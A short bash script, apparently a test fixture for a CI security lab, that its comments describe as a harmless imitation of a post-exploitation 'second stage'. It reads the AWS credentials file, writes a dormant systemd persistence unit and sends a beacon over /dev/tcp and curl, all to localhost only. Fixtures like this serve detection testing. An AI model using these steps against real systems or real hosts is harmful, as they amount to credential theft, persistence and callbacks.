#!/bin/bash
# ROOTLINE lab "second stage" - a BENIGN stand-in, served only from 127.0.0.1
# inside the CI runner. It mimics the *shape* of a post-exploitation step and
# nothing more: it reads a dummy credential file, writes a dummy (never
# enabled) persistence unit, and sends one line to a local listener.
set -eu
cat "$HOME/.aws/credentials" > /dev/null
mkdir -p "$HOME/.config/systemd/user"
printf '[Unit]\nDescription=rootline lab dummy unit (never enabled)\n' \
  > "$HOME/.config/systemd/user/rootline-lab.service"
exec 3<>/dev/tcp/127.0.0.1/4444
echo "rootline-lab beacon" >&3
exec 3>&-
curl -6 -s -o /dev/null "http://[::1]:4445/" || true
